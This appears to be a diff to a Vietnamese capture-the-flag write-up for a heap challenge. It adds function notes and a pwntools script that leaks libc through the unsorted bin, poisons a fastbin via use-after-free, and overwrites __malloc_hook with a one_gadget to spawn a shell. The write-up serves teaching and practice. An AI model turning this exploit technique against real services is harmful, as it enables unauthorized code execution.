@@ -33,7 +33,7 @@ void main(void)
       puts("no option");
       break;
     case 1:
-      createHeap();
+      createHeap;
       break;
     case 2:
       showHeap();
@@ -50,6 +50,12 @@ void main(void)
   } while( true );
 }
 ```
+Các functions chính:
+* `createHeap()`
+* `showHeap()`
+* `editHeap()`
+* `deleteHeap(0)`
+  
 `createHeap()`:
 ```c
 undefined8 createHeap(void)
@@ -77,6 +83,10 @@ undefined8 createHeap(void)
   exit(0);
 }
 ```
+* có tổng 10 chunks có thể tạo được, từ index: 0 -> 9
+* `&store` và `&storeSize` là vùng nhớ trên .bss của binary, với:
+	* `&store`: lưu lại con trỏ trả lại của các chunk cấp phát
+ 	* `&storeSize`: lưu	lại size của các chunk (mỗi size chiếm 4 bytes)
 `showHeap()`:
 ```c
 undefined8 showHeap(void)
@@ -94,6 +104,7 @@ undefined8 showHeap(void)
   exit(0);
 }
 ```
+* `printf("Data = %s\n",(&store)[idx])`: in dữ liệu trong chunk => có thể dùng để leak libc
 `editHeap()`:
 ```c
 undefined8 editHeap(void)
@@ -112,6 +123,7 @@ undefined8 editHeap(void)
   exit(0);
 }
 ```
+* `readStr((&store)[idx],(&storeSize)[idx]);`: cho phép overwrite lại dữ liệu trong chunk 
 `deleteHeap()`:
 ```c
 undefined8 deleteHeap(void)
@@ -130,7 +142,7 @@ undefined8 deleteHeap(void)
   exit(0);
 }
 ```
-
+* `free((&store)[idx]);`: giải phóng chunk vào bins
 
 ___
 ### Exploit:
@@ -151,7 +163,7 @@ pwndbg>
 0x7f5e2219bb3d <main_arena+29>: 0x0000000000000000      0x0000000000000000
 ```
 
-
+heapwin
 ___
 `script.py`:
 ```python
@@ -165,20 +177,23 @@ context.log_level = "debug"
 def GDB():
 	gdb.attach(p, gdbscript='''
 		handle SIGALRM ignore
-		# main
-		br *0x400ca9
-		# create
-		br *0x400aa2
-		br *0x400b06
-		# delete
-		br *0x400b67
-		br *0x400bde
+		br createHeap
+		br *createHeap + 115
+		br *createHeap + 234
+		br showHeap
+		br *showHeap + 133
+		br editHeap
+		br deleteHeap
+		br *deleteHeap + 123
+		br *__malloc_hook
 
 		# heap check:
 		# heap [-v]
 		# vis
 		# vmmap
-		# x/4gx 0x006020e0
+		# x/4gx &store
+		# x/4gx &storeSize
+		# p &__malloc_hook
 		''')
 
 p = process(exe.path)
@@ -186,13 +201,13 @@ p = process(exe.path)
 
 def createHeap(idx, size, data):
 	p.sendlineafter(b">", b"1")
-	p.sendlineafter(b"index:", idx)
+	p.sendlineafter(b"Index:", idx)
 	p.sendlineafter(b"size:", size)
 	p.sendlineafter(b"data:", data)
 
 def showHeap(idx):
 	p.sendlineafter(b">", b"2")
-	p.sendlineafter(b"index:", idx)
+	p.sendlineafter(b"Index:", idx)
 
 def editHeap(idx, data):
 	p.sendlineafter(b">", b"3")
@@ -202,6 +217,53 @@ def editHeap(idx, data):
 def deleteHeap(idx):
 	p.sendlineafter(b">", b"4")
 	p.sendlineafter(b"index:", idx)
+
+# big chunk to unsortedbin
+createHeap(b'0', b'1040', b'A'*8)
+# avoid consolidation
+createHeap(b'1', b'16', b'B'*8)
+
+deleteHeap(b'0')
+
+# leak fd/bk ptr 
+showHeap(b'0')
+
+# calculate offsets
+p.recvuntil(b"=")
+leak_libc = p.recvline().strip()
+leak_libc = u64(leak_libc.ljust(8, b"\x00"))
+print(f"leak_libc: {hex(leak_libc)}")
+
+libc.address = leak_libc - 0x39bb78
+
+print(f"libc_base: {hex(libc.address)}")
+
+malloc_hook = libc.address + 0x39bb10
+fake_chunk = libc.sym['__malloc_hook'] - 0x23
+realloc = libc.sym['realloc']
+
+print(f"malloc_hook: {hex(malloc_hook)}")
+print(f"fake_chunk: {hex(fake_chunk)}")
+
+# GDB()
+createHeap(b'2', b'96', b'C'*8) # 0x60 --> 0x70
+deleteHeap(b'2')
+
+editHeap(b'2', p64(fake_chunk))
+
+createHeap(b'3', b'96', b'D'*8)
+
+# 0x3f3d6 / 0x3f42a / 0xd5bf7
+one_gadget = libc.address + 0xd5bf7
+
+# payload = b'A' * 19 + p64(one_gadget)
+payload = b'A' * 11 + p64(one_gadget) + p64(realloc + 14)
+createHeap(b'4', b'96', payload)
+
+GDB()
+p.sendlineafter(b">", b"1")
+p.sendlineafter(b"Index:", b'5')
+p.sendlineafter(b"size:", b'10')
 
 p.interactive()
 ```
